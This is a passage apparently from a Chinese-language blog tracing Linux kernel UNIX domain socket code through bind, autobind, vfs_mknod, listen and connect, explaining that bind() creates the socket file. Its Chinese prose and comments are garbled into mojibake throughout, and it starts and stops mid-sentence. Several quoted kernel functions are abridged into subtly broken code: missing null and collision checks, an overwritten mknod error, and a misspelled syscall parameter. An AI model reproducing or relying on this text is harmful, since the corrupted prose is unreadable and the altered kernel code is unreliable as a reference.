ç”¨å’Œç®¡ç†å¼€é”€ã€‚\nç¬¬ä¸€ç§:unix_bind()-\u0026gt;unix_autobind()\nunix_autobind() æ˜¯ä¸€ä¸ªç”¨äºè‡ªåŠ¨ä¸ºå¥—æ¥å­—åˆ†é…åœ°å€çš„å‡½æ•°ï¼Œé€‚ç”¨äº UNIX domain socket æ²¡æœ‰æä¾›å…·ä½“ç»‘å®šåœ°å€çš„æƒ…å†µã€‚å½“ç”¨æˆ·è°ƒç”¨ bind() ä½†æ˜¯æ²¡æœ‰æŒ‡å®šåœ°å€æ—¶ï¼Œunix_autobind() ä¼šè¢«è°ƒç”¨ï¼Œå®ƒä¼šä¸ºå¥—æ¥å­—ç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„ã€ä¸´æ—¶çš„æŠ½è±¡åœ°å€ã€‚\nstatic int unix_autobind(struct sock *sk) { unsigned int new_hash, old_hash = sk-\u0026gt;sk_hash; struct unix_sock *u = unix_sk(sk); struct net *net = sock_net(sk); struct unix_address *addr; u32 lastnum, ordernum; //ordernum å’Œ lastnumï¼šç”¨äºç”Ÿæˆå”¯ä¸€çš„æŠ½è±¡åœ°å€ã€‚ int err; err = mutex_lock_interruptible(\u0026amp;u-\u0026gt;bindlock); if (err) return err; if (u-\u0026gt;addr) goto out; err = -ENOMEM; // ä½¿ç”¨ kzalloc() ä¸º unix_address ç»“æ„åˆ†é…å†…å­˜ï¼ŒåŒ…å«äº†åœ°å€ç»“æ„å’Œ sun_path çš„å­˜å‚¨ç©ºé—´ã€‚å¦‚æœå†…å­˜åˆ†é…å¤±è´¥ï¼Œè¿”å› -ENOMEMã€‚ä½¿ç”¨ kzalloc() ä¸º unix_address ç»“æ„åˆ†é…å†…å­˜ï¼ŒåŒ…å«äº†åœ°å€ç»“æ„å’Œ sun_path çš„å­˜å‚¨ç©ºé—´ã€‚å¦‚æœå†…å­˜åˆ†é…å¤±è´¥ï¼Œè¿”å› -ENOMEMã€‚ addr = kzalloc(sizeof(*addr) + offsetof(struct sockaddr_un, sun_path) + 16, GFP_KERNEL); if (!addr) goto out; addr-\u0026gt;len = offsetof(struct sockaddr_un, sun_path) + 6; addr-\u0026gt;name-\u0026gt;sun_family = AF_UNIX; refcount_set(\u0026amp;addr-\u0026gt;refcnt, 1); // ä½¿ç”¨ get_random_u32() è·å–ä¸€ä¸ªéšæœºæ•°ï¼Œç”¨äºç”Ÿæˆå”¯ä¸€çš„æŠ½è±¡åœ°å€ã€‚ ordernum = get_random_u32(); // lastnum ä¿å­˜äº†éšæœºæ•°çš„ä½ 20 ä½ï¼Œç”¨äºé™åˆ¶å¾ªç¯æ¬¡æ•°ï¼Œç¡®ä¿ä¸ä¼šæ— é™å¾ªç¯ã€‚ lastnum = ordernum \u0026amp; 0xFFFFF; retry: // ç”Ÿæˆå’Œæ£€æŸ¥åœ°å€å”¯ä¸€æ€§ (retry)ï¼š ordernum = (ordernum + 1) \u0026amp; 0xFFFFF; sprintf(addr-\u0026gt;name-\u0026gt;sun_path + 1, \u0026#34;%05x\u0026#34;, ordernum); new_hash = unix_abstract_hash(addr-\u0026gt;name, addr-\u0026gt;len, sk-\u0026gt;sk_type); unix_table_double_lock(net, old_hash, new_hash); // æ£€æŸ¥åœ°å€æ˜¯å¦å·²å­˜åœ¨ if (__unix_find_socket_byname(net, addr-\u0026gt;name, addr-\u0026gt;len, new_hash)) { unix_table_double_unlock(net, old_hash, new_hash); /* __unix_find_socket_byname() may take long time if many names * are already in use. */ //å¦‚æœåœ°å€å·²å­˜åœ¨ï¼Œè§£é”å“ˆå¸Œè¡¨ï¼Œå¹¶è°ƒç”¨ cond_resched() è®©å‡º CPU èµ„æºï¼Œç„¶åç»§ç»­ç”Ÿæˆæ–°çš„åœ°å€ï¼ˆè·³è½¬åˆ° retry æ ‡ç­¾ï¼‰ã€‚å¦‚æœæ‰€æœ‰åœ°å€éƒ½å·²ç”¨å°½ï¼Œè¿”å› -ENOSPCï¼Œè¡¨ç¤ºæ²¡æœ‰ç©ºé—´å¯ç”¨ã€‚ cond_resched(); if (ordernum == lastnum) { /* Give up if all names seems to be in use. */ err = -ENOSPC; unix_release_addr(addr); goto out; } goto retry; } // __unix_set_addr_hash() å°†ç”Ÿæˆçš„åœ°å€è®¾ç½®åˆ°å¥—æ¥å­—ä¸­ï¼Œå¹¶æ›´æ–°å“ˆå¸Œè¡¨ã€‚ __unix_set_addr_hash(net, sk, addr, new_hash); unix_table_double_unlock(net, old_hash, new_hash); err = 0; out:\tmutex_unlock(\u0026amp;u-\u0026gt;bindlock); return err; } ç¬¬äºŒç§ï¼šunix_bind()-\u0026gt;unix_bind_abstract()\nunix_bind_abstract() æ˜¯ä¸€ä¸ªç”¨äºå°† UNIX domain socket åœ°å€ç»‘å®šåˆ°å¥—æ¥å­—çš„å†…æ ¸å‡½æ•°ï¼Œä¸“é—¨ç”¨äºæŠ½è±¡é£æ ¼åœ°å€ï¼ˆå³ä¸ä¾èµ–äºæ–‡ä»¶ç³»ç»Ÿçš„åœ°å€ï¼‰ã€‚è¿™ä¸ªå‡½æ•°è´Ÿè´£ç¡®ä¿å¥—æ¥å­—è¢«ç»‘å®šåˆ°ä¸€ä¸ªå”¯ä¸€çš„æŠ½è±¡åœ°å€ï¼Œå¹¶å¯¹åœ°å€è¿›è¡Œå“ˆå¸Œå’Œæ³¨å†Œå¤„ç†ã€‚ä»¥ä¸‹æ˜¯å¯¹è¯¥å‡½æ•°çš„è¯¦ç»†åˆ†æã€‚\nstatic int unix_bind_abstract(struct sock *sk, struct sockaddr_un *sunaddr, int addr_len) { unsigned int new_hash, old_hash = sk-\u0026gt;sk_hash; struct unix_sock *u = unix_sk(sk); struct net *net = sock_net(sk); struct unix_address *addr; int err; // åˆ›å»ºUNIXåœ°å€,ä¸ºæŠ½è±¡åœ°å€åˆ†é…å†…å­˜ï¼Œå¹¶å°†ç”¨æˆ·æä¾›çš„åœ°å€æ•°æ®ï¼ˆsunaddrï¼‰è½¬æ¢ä¸ºå†…æ ¸ä½¿ç”¨çš„åœ°å€ç»“æ„ã€‚ addr = unix_create_addr(sunaddr, addr_len); //ä½¿ç”¨ unix_abstract_hash() è®¡ç®—æ–°åœ°å€çš„å“ˆå¸Œå€¼ï¼Œç”¨äºå°†æŠ½è±¡åœ°å€æ”¾å…¥å†…æ ¸ä¸­çš„å“ˆå¸Œè¡¨è¿›è¡Œç®¡ç†ã€‚ new_hash = unix_abstract_hash(addr-\u0026gt;name, addr-\u0026gt;len, sk-\u0026gt;sk_type); //__unix_set_addr_hash() è®¾ç½®æ–°çš„ç»‘å®šåœ°å€ï¼Œå¹¶å°†å…¶æ’å…¥å“ˆå¸Œè¡¨ä¸­ï¼Œä»¥ä¾¿åç»­å¯ä»¥é€šè¿‡åœ°å€å¿«é€Ÿæ‰¾åˆ°å¯¹åº”çš„å¥—æ¥å­—ã€‚ __unix_set_addr_hash(net, sk, addr, new_hash); return 0; } ç¬¬ä¸‰ç§ï¼šunix_bind()-\u0026gt;unix_bind_bsd()\nunix_bind_bsd() æ˜¯å†…æ ¸ä¸­ç”¨äºå°† BSD é£æ ¼çš„ UNIX domain socket åœ°å€ç»‘å®šåˆ°å¥—æ¥å­—çš„å‡½æ•°ã€‚å®ƒå®ç°äº†å°†å¥—æ¥å­—åœ°å€ç»‘å®šåˆ°æ–‡ä»¶ç³»ç»Ÿè·¯å¾„çš„é€»è¾‘ï¼Œå¹¶ç¡®ä¿åœ°å€å”¯ä¸€æ€§å’Œç›¸åº”çš„æ–‡ä»¶ç³»ç»Ÿæ“ä½œã€‚ä»¥ä¸‹æ˜¯å¯¹è¿™ä¸ªå‡½æ•°çš„è¯¦ç»†åˆ†æã€‚\nstatic int unix_bind_bsd(struct sock *sk, struct sockaddr_un *sunaddr, int addr_len) { umode_t mode = S_IFSOCK | // è®¾ç½®æ–‡ä»¶æ¨¡å¼ä¸ºå¥—æ¥å­— (SOCK_INODE(sk-\u0026gt;sk_socket)-\u0026gt;i_mode \u0026amp; ~current_umask()); // æ ¹æ®å¥—æ¥å­—çš„æ¨¡å¼å’Œå½“å‰æ©ç è®¡ç®—æ–‡ä»¶æ¨¡å¼ unsigned int new_hash, old_hash = sk-\u0026gt;sk_hash; // æ–°æ—§å“ˆå¸Œå€¼ struct unix_sock *u = unix_sk(sk); // è·å–UNIXå¥—æ¥å­—ç»“æ„ä½“ struct net *net = sock_net(sk); // è·å–å¥—æ¥å­—å…³è”çš„ç½‘ç»œå‘½åç©ºé—´ struct mnt_idmap *idmap; // IDæ˜ å°„ struct unix_address *addr; // UNIXåœ°å€ç»“æ„ struct dentry *dentry; // ç›®å½•é¡¹ struct path parent; // çˆ¶ç›®å½•è·¯å¾„ int err; // é”™è¯¯ç  // å¯¹ä¼ å…¥çš„åœ°å€è¿›è¡Œå¤„ç†ï¼Œç¡®ä¿å…¶æ ¼å¼æ­£ç¡®ï¼Œå¹¶è®¡ç®—æ‰€éœ€çš„åœ°å€é•¿åº¦ã€‚ addr_len = unix_mkname_bsd(sunaddr, addr_len); // unix_create_addr()ï¼šä¸ºå¥—æ¥å­—åœ°å€åˆ†é…å†…å­˜ï¼Œå°†ä¼ å…¥çš„åœ°å€æ•°æ®å­˜å‚¨åœ¨æ–°åˆ›å»ºçš„ unix_address ç»“æ„ä¸­ã€‚å¦‚æœåˆ†é…å¤±è´¥ï¼Œè¿”å› -ENOMEMã€‚ addr = unix_create_addr(sunaddr, addr_len); if (!addr) return -ENOMEM; // å†…å­˜åˆ†é…å¤±è´¥ // kern_path_create()ï¼šæŸ¥æ‰¾æˆ–åˆ›å»ºå¯¹åº”è·¯å¾„çš„ç›®å½•é¡¹ (dentry)ï¼Œè·å–åœ°å€æ‰€åœ¨è·¯å¾„çš„çˆ¶ç›®å½• (parent)ã€‚ dentry = kern_path_create(AT_FDCWD, addr-\u0026gt;name-\u0026gt;sun_path, \u0026amp;parent, 0); if (IS_ERR(dentry)) { // å¤„ç†é”™è¯¯ err = PTR_ERR(dentry); goto out; } // åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»ºå¥—æ¥å­—èŠ‚ç‚¹ idmap = mnt_idmap(parent.mnt); // è·å–IDæ˜ å°„ err = security_path_mknod(\u0026amp;parent, dentry, mode, 0); // é¦–å…ˆè¿›è¡Œå®‰å…¨æ£€æŸ¥ï¼Œç¡®ä¿å½“å‰è¿›ç¨‹æœ‰æƒé™åœ¨æŒ‡å®šè·¯å¾„åˆ›å»ºèŠ‚ç‚¹ã€‚ if (!err) err = vfs_mknod(idmap, d_inode(parent.dentry), dentry, mode, 0); // åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»ºèŠ‚ç‚¹ï¼Œç”¨äºè¡¨ç¤ºè¯¥ UNIX domain socketã€‚ err = mutex_lock_interruptible(\u0026amp;u-\u0026gt;bindlock); // é”å®šäº’æ–¥é‡ new_hash = unix_bsd_hash(d_backing_inode(dentry)); // åˆ›å»ºå“ˆå¸Œå€¼ unix_table_double_lock(net, old_hash, new_hash); // é”å®šåŒå‘å“ˆå¸Œè¡¨ u-\u0026gt;path.mnt = mntget(parent.mnt); // è®¾ç½®è·¯å¾„ u-\u0026gt;path.dentry = dget(dentry); // è®¾ç½®ç›®å½•é¡¹ __unix_set_addr_hash(net, sk, addr, new_hash); // è®¾ç½®åœ°å€å“ˆå¸Œ unix_table_double_unlock(net, old_hash, new_hash); // è§£é”åŒå‘å“ˆå¸Œè¡¨ unix_insert_bsd_socket(sk); // unix_insert_bsd_socket()ï¼šå°†è¯¥å¥—æ¥å­—æ’å…¥åˆ° BSD é£æ ¼å¥—æ¥å­—çš„ç®¡ç†ç»“æ„ä¸­ã€‚ mutex_unlock(\u0026amp;u-\u0026gt;bindlock); // è§£é”äº’æ–¥é‡ done_path_create(\u0026amp;parent, dentry); return 0;\tvfs_mknod()\nvfs_mknod() æ˜¯å†…æ ¸ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºåœ¨æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»ºè®¾å¤‡èŠ‚ç‚¹æˆ–æ™®é€šæ–‡ä»¶ã€‚\nint vfs_mknod(struct mnt_idmap *idmap, struct inode *dir, struct dentry *dentry, umode_t mode, dev_t dev) { // is_whiteoutï¼šæ£€æŸ¥åˆ›å»ºçš„èŠ‚ç‚¹æ˜¯å¦ä¸ºâ€œwhiteoutâ€è®¾å¤‡èŠ‚ç‚¹ï¼ˆç‰¹å®šåœºæ™¯ä¸‹è¡¨ç¤ºè¦†ç›–çš„å­—ç¬¦è®¾å¤‡èŠ‚ç‚¹ï¼‰ã€‚è¿™æ˜¯ä¸€ä¸ªç‰¹æ®Šç±»å‹ï¼Œç”¨äºæŸäº›æ–‡ä»¶ç³»ç»Ÿæ“ä½œï¼Œæ¯”å¦‚åœ¨ overlay æ–‡ä»¶ç³»ç»Ÿä¸­ã€‚ bool is_whiteout = S_ISCHR(mode) \u0026amp;\u0026amp; dev == WHITEOUT_DEV; // may_create()ï¼šæ£€æŸ¥æ˜¯å¦æœ‰æƒé™åœ¨çˆ¶ç›®å½•ä¸­åˆ›å»ºæ–°æ–‡ä»¶æˆ–è®¾å¤‡èŠ‚ç‚¹ã€‚å¦‚æœæ²¡æœ‰æƒé™ï¼Œåˆ™ç›´æ¥è¿”å›é”™è¯¯ã€‚ int error = may_create(idmap, dir, dentry); if (error) return error; //S_ISCHR(mode) å’Œ S_ISBLK(mode)ï¼šåˆ¤æ–­æ‰€è¦åˆ›å»ºçš„èŠ‚ç‚¹æ˜¯å¦ä¸ºå­—ç¬¦è®¾å¤‡æˆ–å—è®¾å¤‡ã€‚å¦‚æœæ˜¯å­—ç¬¦è®¾å¤‡æˆ–å—è®¾å¤‡èŠ‚ç‚¹ï¼Œä¸”ä¸æ˜¯ \u0026#34;whiteout\u0026#34;ï¼Œåˆ™éœ€è¦è°ƒç”¨ capable(CAP_MKNOD) æ¥æ£€æŸ¥æ˜¯å¦å…·æœ‰åˆ›å»ºè®¾å¤‡èŠ‚ç‚¹çš„æƒé™ï¼ˆé€šå¸¸æ˜¯è¶…çº§ç”¨æˆ·æƒé™ï¼‰ã€‚å¦‚æœæ²¡æœ‰æƒé™ï¼Œè¿”å› -EPERMï¼ˆæ“ä½œä¸å…è®¸ï¼‰ã€‚ if ((S_ISCHR(mode) || S_ISBLK(mode)) \u0026amp;\u0026amp; !is_whiteout \u0026amp;\u0026amp; !capable(CAP_MKNOD)) return -EPERM; // æ£€æŸ¥çˆ¶ç›®å½•çš„ inode æ“ä½œ (i_op) æ˜¯å¦æ”¯æŒ mknodï¼Œå³æ˜¯å¦å…·æœ‰åˆ›å»ºè®¾å¤‡èŠ‚ç‚¹çš„åŠŸèƒ½ã€‚å¦‚æœçˆ¶ç›®å½•ä¸æ”¯æŒè¯¥æ“ä½œï¼Œåˆ™è¿”å› -EPERMã€‚ if (!dir-\u0026gt;i_op-\u0026gt;mknod) return -EPERM; mode = vfs_prepare_mode(idmap, dir, mode, mode, mode); error = devcgroup_inode_mknod(mode, dev); if (error) return error; error = security_inode_mknod(dir, dentry, mode, dev); if (error) return error; // dir-\u0026gt;i_op-\u0026gt;mknod()ï¼šå®é™…è°ƒç”¨æ–‡ä»¶ç³»ç»Ÿæä¾›çš„ mknod æ“ä½œæ¥åˆ›å»ºè®¾å¤‡èŠ‚ç‚¹ã€‚è¿™ä¸ªæ“ä½œç”±å…·ä½“çš„æ–‡ä»¶ç³»ç»Ÿå®ç°ï¼ˆå¦‚ EXT4ã€XFS ç­‰ï¼‰ã€‚ error = dir-\u0026gt;i_op-\u0026gt;mknod(idmap, dir, dentry, mode, dev); if (!error) fsnotify_create(dir, dentry); return error; } EXPORT_SYMBOL(vfs_mknod); é—®é¢˜ï¼šæ‰€ä»¥sockæ–‡ä»¶åˆ°åº•æ˜¯socketå‡½æ•°åˆ›å»ºçš„è¿˜æ˜¯bindå‡½æ•°åˆ›å»ºçš„ï¼Ÿ\nç­”ï¼šsock æ–‡ä»¶ï¼ˆå³ UNIX domain socket æ–‡ä»¶ï¼‰å®é™…ä¸Šæ˜¯åœ¨ bind() å‡½æ•°çš„æ‰§è¡Œè¿‡ç¨‹ä¸­åˆ›å»ºçš„ï¼Œè€Œä¸æ˜¯åœ¨è°ƒç”¨ socket() å‡½æ•°æ—¶åˆ›å»ºçš„ã€‚\nsocket() å‡½æ•°çš„ä½œç”¨ socket() å‡½æ•°åˆ›å»ºçš„æ˜¯å¥—æ¥å­—çš„å†…æ ¸å¯¹è±¡ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼ˆfdï¼‰ï¼Œç”¨äºè¡¨ç¤ºä¸€ä¸ªå¥—æ¥å­—ã€‚ å½“ä½ è°ƒç”¨ socket() å‡½æ•°æ—¶ï¼Œå†…æ ¸ä¼šä¸ºè¯¥å¥—æ¥å­—åˆ†é…å¿…è¦çš„å†…æ ¸ç»“æ„ä½“ï¼ˆä¾‹å¦‚ struct socket å’Œ struct sockï¼‰ï¼Œå¹¶åˆå§‹åŒ–ä¸è¯¥å¥—æ¥å­—ç›¸å…³çš„å†…æ ¸æ•°æ®ç»“æ„ã€‚ åœ¨è¿™ä¸€æ­¥ï¼Œè™½ç„¶å¥—æ¥å­—çš„å¯¹è±¡å·²ç»å­˜åœ¨ï¼Œä½†è¿˜æ²¡æœ‰ä¸å…·ä½“çš„æ–‡ä»¶ç³»ç»Ÿè·¯å¾„è¿›è¡Œå…³è”ã€‚å› æ­¤ï¼Œè¿™æ—¶å€™å¹¶æ²¡æœ‰äº§ç”Ÿä»»ä½•æ–‡ä»¶ç³»ç»Ÿä¸­çš„èŠ‚ç‚¹ï¼ˆsock æ–‡ä»¶ï¼‰ã€‚ bind() å‡½æ•°çš„ä½œç”¨ bind() å‡½æ•°çš„ä½œç”¨æ˜¯å°†å¥—æ¥å­—ä¸ä¸€ä¸ªå…·ä½“çš„åœ°å€ç»‘å®šã€‚åœ¨ UNIX domain socket çš„åœºæ™¯ä¸‹ï¼Œè¿™ä¸ªåœ°å€å¯ä»¥æ˜¯ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­çš„è·¯å¾„ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªæŠ½è±¡åç§°ã€‚ å¯¹äº BSD é£æ ¼ çš„ UNIX domain socketï¼Œè°ƒç”¨ bind() å‡½æ•°æ—¶ï¼Œä¼šåœ¨æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»ºä¸€ä¸ªæ–‡ä»¶èŠ‚ç‚¹ï¼Œè¿™ä¸ªèŠ‚ç‚¹å°±æ˜¯æˆ‘ä»¬åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­çœ‹åˆ°çš„ .sock æ–‡ä»¶ï¼Œæˆ–è€…æ˜¯ç±»ä¼¼ /tmp/mysocket çš„æ–‡ä»¶ã€‚ å…·ä½“æ¥è¯´ï¼Œbind() å‡½æ•°ä¸­ä¼šè°ƒç”¨ vfs_mknod()ï¼Œå®ƒåœ¨æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶èŠ‚ç‚¹ï¼ˆç±»å‹ä¸º S_IFSOCKï¼‰ï¼Œå¹¶æŠŠè¿™ä¸ªèŠ‚ç‚¹ä¸å¥—æ¥å­—ç›¸å…³è”ã€‚è¿™æ ·ï¼Œå…¶ä»–è¿›ç¨‹å°±å¯ä»¥é€šè¿‡è¯¥è·¯å¾„æ‰¾åˆ°è¿™ä¸ªå¥—æ¥å­—ï¼Œä»è€Œè¿›è¡Œé€šä¿¡ã€‚ sock æ–‡ä»¶çš„åˆ›å»ºè¿‡ç¨‹\nä»¥ä¸‹æ˜¯ sock æ–‡ä»¶åˆ›å»ºçš„å…³é”®æ­¥éª¤ï¼š\n(1)è°ƒç”¨ socket() å‡½æ•°ï¼š\nåˆ›å»ºå¥—æ¥å­—å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œæ ‡è¯†è¿™ä¸ªå¥—æ¥å­—ã€‚\næ­¤æ—¶ï¼Œå†…æ ¸ä¸­åˆ›å»ºäº†å¥—æ¥å­—çš„ç›¸å…³æ•°æ®ç»“æ„ï¼Œä½†æ–‡ä»¶ç³»ç»Ÿä¸­å¹¶æ²¡æœ‰ä»»ä½•ä½“ç°ã€‚\n(2)è°ƒç”¨ bind() å‡½æ•°ï¼š\nå°†å¥—æ¥å­—ä¸å…·ä½“çš„åœ°å€ç»‘å®šã€‚å¯¹äº UNIX domain socketï¼Œè¿™ä¸ªåœ°å€æ˜¯ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿè·¯å¾„ï¼ˆBSD é£æ ¼ï¼‰æˆ–æŠ½è±¡è·¯å¾„ã€‚ å¦‚æœæ˜¯ BSD é£æ ¼çš„åœ°å€ï¼Œbind() å‡½æ•°ä¼šåœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ä¸ºè¯¥åœ°å€åˆ›å»ºä¸€ä¸ªæ–‡ä»¶èŠ‚ç‚¹ã€‚æ¯”å¦‚ /tmp/mysocketã€‚ å†…æ ¸ä¸­ä¼šè°ƒç”¨ vfs_mknod() æˆ–ç±»ä¼¼çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°æ¥åˆ›å»ºè®¾å¤‡èŠ‚ç‚¹ï¼Œç¡®ä¿åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­æœ‰ä¸€ä¸ªå¯¹åº”çš„æ–‡ä»¶ï¼Œè¡¨ç¤ºè¯¥ UNIX domain socket åœ°å€ã€‚ å¦‚æœæ˜¯æŠ½è±¡åœ°å€ï¼Œåˆ™æ²¡æœ‰æ–‡ä»¶ç³»ç»ŸèŠ‚ç‚¹çš„åˆ›å»ºï¼Œä»…åœ¨å†…æ ¸ä¸­ç»´æŠ¤ç›¸åº”çš„æŠ½è±¡è·¯å¾„ã€‚ listen() ä¸€å¥è¯æ¦‚æ‹¬listenå‡½æ•°ï¼šå°†å¥—æ¥å­—çŠ¶æ€è®¾ç½®ä¸ºç›‘å¬æ¨¡å¼ã€‚\n//syscall SYSCALL_DEFINE2(listen, int, fd, int, backlog) { return __sys_listen(fd, backlog); } listen()-\u0026gt;sys_listen()\nè¿™æ®µä»£ç å®ç°äº†å†…æ ¸ä¸­ listen() ç³»ç»Ÿè°ƒç”¨çš„æ ¸å¿ƒéƒ¨åˆ†ã€‚å®ƒç”¨äºå°†ä¸€ä¸ªå¥—æ¥å­—è½¬æ¢ä¸ºè¢«åŠ¨è¿æ¥æ¨¡å¼ï¼Œå¼€å§‹ç›‘å¬æ¥è‡ªå®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚ã€‚\nint __sys_listen(int fd, int backlog) { struct socket *sock; int err, fput_needed; int somaxconn; //sockfd_lookup_light() ç”¨äºæŸ¥æ‰¾ä¸ç»™å®šæ–‡ä»¶æè¿°ç¬¦ fd å…³è”çš„å¥—æ¥å­—å¯¹è±¡ (struct socket)ã€‚ sock = sockfd_lookup_light(fd, \u0026amp;err, \u0026amp;fput_needed); if (sock) { //è®¾ç½®æœ€å¤§è¿æ¥æ•° (somaxconn) somaxconn = READ_ONCE(sock_net(sock-\u0026gt;sk)-\u0026gt;core.sysctl_somaxconn); if ((unsigned int)backlog \u0026gt; somaxconn) backlog = somaxconn; err = security_socket_listen(sock, backlog); if (!err) // è°ƒç”¨åè®®æ ˆçš„ listen() å‡½æ•°ï¼Œå°†å¥—æ¥å­—è½¬æ¢ä¸ºç›‘å¬æ¨¡å¼ã€‚ err = READ_ONCE(sock-\u0026gt;ops)-\u0026gt;listen(sock, backlog); // é‡Šæ”¾æ–‡ä»¶å¼•ç”¨ï¼š fput_light(sock-\u0026gt;file, fput_needed); } return err; } sys_listen()-\u0026gt;unix_listen()\nstatic int unix_listen(struct socket *sock, int backlog) { int err; // é”™è¯¯ç  struct sock *sk = sock-\u0026gt;sk; // è·å–å¥—æ¥å­—çš„åŸºç¡€ç»“æ„ struct unix_sock *u = unix_sk(sk); // è·å–UNIXå¥—æ¥å­—ç»“æ„ err = -EOPNOTSUPP; // æ£€æŸ¥å¥—æ¥å­—ç±»å‹æ˜¯å¦ä¸º SOCK_STREAM æˆ– SOCK_SEQPACKET if (sock-\u0026gt;type != SOCK_STREAM \u0026amp;\u0026amp; sock-\u0026gt;type != SOCK_SEQPACKET) // ä»…æœ‰æµå¥—æ¥å­—å’Œé¡ºåºåŒ…å¥—æ¥å­—æ”¯æŒç›‘å¬ goto out; err = -EINVAL; // æ£€æŸ¥æ˜¯å¦ç»‘å®šåœ°å€ï¼Œæœªç»‘å®šåœ°å€çš„å¥—æ¥å­—ä¸èƒ½è¿›è¡Œç›‘å¬ if (!u-\u0026gt;addr) goto out; unix_state_lock(sk); // é”å®šå¥—æ¥å­—çŠ¶æ€ // æ£€æŸ¥å¥—æ¥å­—çŠ¶æ€æ˜¯å¦ä¸º TCP_CLOSE æˆ– TCP_LISTEN if (sk-\u0026gt;sk_state != TCP_CLOSE \u0026amp;\u0026amp; sk-\u0026gt;sk_state != TCP_LISTEN) goto out_unlock; // å¥—æ¥å­—çŠ¶æ€å¿…é¡»ä¸ºå…³é—­æˆ–ç›‘å¬ // å¦‚æœæ–°çš„SYNç­‰å¾…é˜Ÿåˆ—å¤§å°å¤§äºå½“å‰çš„SYNæœ€å¤§ç­‰å¾…é˜Ÿåˆ—å¤§å°ï¼Œåˆ™å”¤é†’æ‰€æœ‰SYNç­‰å¾…é˜Ÿåˆ—ä¸­çš„å¯¹ç­‰ä½“ if (backlog \u0026gt; sk-\u0026gt;sk_max_ack_backlog) wake_up_interruptible_all(\u0026amp;u-\u0026gt;peer_wait); sk-\u0026gt;sk_max_ack_backlog = backlog; // è®¾ç½®æ–°çš„ç­‰å¾…é˜Ÿåˆ—å¤§å° sk-\u0026gt;sk_state = TCP_LISTEN; // å°†å¥—æ¥å­—çŠ¶æ€è®¾ç½®ä¸ºç›‘å¬ // è®¾ç½®è¿æ¥çš„å‡­è¯ï¼Œä»¥ä¾¿è¿æ¥æ“ä½œå¯ä»¥å¤åˆ¶å®ƒä»¬ init_peercred(sk); err = 0; out_unlock: unix_state_unlock(sk); // è§£é”å¥—æ¥å­—çŠ¶æ€ out: return err; // è¿”å›é”™è¯¯ç  } connect() ä¸€å¥è¯æ¦‚æ‹¬connectå‡½æ•°ï¼šå®ç°äº† UNIX domain socket çš„è¿æ¥é€»è¾‘ã€‚å®ƒå¤„ç†äº†å®¢æˆ·ç«¯å¥—æ¥å­—è¿æ¥åˆ°æœåŠ¡å™¨ç›‘å¬å¥—æ¥å­—çš„è¿‡ç¨‹ã€‚\n//syscall SYSCALL_DEFINE3(connect, int, fd, struct sockaddr __user *, uwservaddr, int, addrlen) { return __sys_connect(fd, uservaddr, addrlen); } connect()-\u0026gt;__sys_connect()\nint __sys_connect(int fd, struct sockaddr __user *uservaddr, int addrlen) { int ret = -EBADF; struct fd f; // è·å–æ–‡ä»¶æè¿°ç¬¦çš„Xæ–‡ä»¶å¯¹è±¡ (fdget())ï¼š f = fdget(fd); if (f.file) { struct sockaddr_storage address; // move_addr_to_kernel()ï¼šå°†ç”¨æˆ·ç©ºé—´çš„åœ°å€ï¼ˆuservaddrï¼‰ç§»åŠ¨åˆ°å†…æ ¸ç©ºé—´çš„ address ç»“æ„ä¸­ã€‚è¿™ä¸€æ­¥å°†ç”¨æˆ·æä¾›çš„åœ°å€æ‹·è´åˆ°å†…æ ¸ä¸­ï¼Œä»¥ä¾¿å†…æ ¸èƒ½å¤Ÿå®‰å…¨åœ°ä½¿ç”¨å®ƒã€‚ ret = move_addr_to_kernel(uservaddr, addrlen, \u0026amp;address); if (!ret) // __sys_connect_file()ï¼šè¿™æ˜¯ä¸€ä¸ªå®é™…è¿›è¡Œè¿æ¥æ“ä½œçš„å‡½æ•°ã€‚å®ƒæ¥æ”¶æ–‡ä»¶å¯¹è±¡ï¼ˆå³å¥—æ¥å­—ï¼‰ã€å†…æ ¸ä¸­çš„åœ°å€ç»“æ„ä»¥åŠåœ°å€é•¿åº¦ï¼Œå®Œæˆè¿æ¥æ“ä½œã€‚ ret = __sys_connect_file(f.file, \u0026amp;address, addrlen, 0); fdput(f); } return ret; } __sys_connect()-\u0026gt;__sys_connect_file()\nint __sys_connect_file(struct file *file, struct sockaddr_storage *address, int addrlen, int file_flags) { struct socket *sock; int err; // è·å–å¥—æ¥å­—å¯¹è±¡ sock = sock_from_file(file); if (!sock) { err = -ENOTSOCK; goto out; } // security_socket_connect()ï¼šè°ƒç”¨ Linux å®‰å…¨æ¨¡å—ï¼ˆLSMï¼‰è¿›è¡Œå®‰å…¨æ£€æŸ¥ï¼Œç¡®ä¿å½“å‰ç”¨æˆ·æˆ–è¿›ç¨‹æœ‰æƒé™å¯¹æŒ‡å®šçš„å¥—æ¥å­—å‘èµ·è¿æ¥è¯·æ±‚ã€‚ err = security_socket_connect(sock, (struct sockaddr *)address, addrlen); if (err) goto out; // READ_ONCE(sock-\u0026gt;ops)ï¼šè¯»å–å¥—æ¥å­—æ“ä½œè¡¨ã€‚ç”±äºå¥—æ¥å­—çš„æ“ä½œè¡¨å¯èƒ½ä¼šè¢«å¤šçº¿ç¨‹å¹¶å‘ä¿®æ”¹ï¼Œä½¿ç”¨ READ_ONCE() ç¡®ä¿è¯»å–çš„å€¼æ˜¯æœ€æ–°çš„ã€‚ // sock-\u0026gt;ops-\u0026gt;connect()ï¼šè°ƒç”¨å¥—æ¥å­—çš„ connect 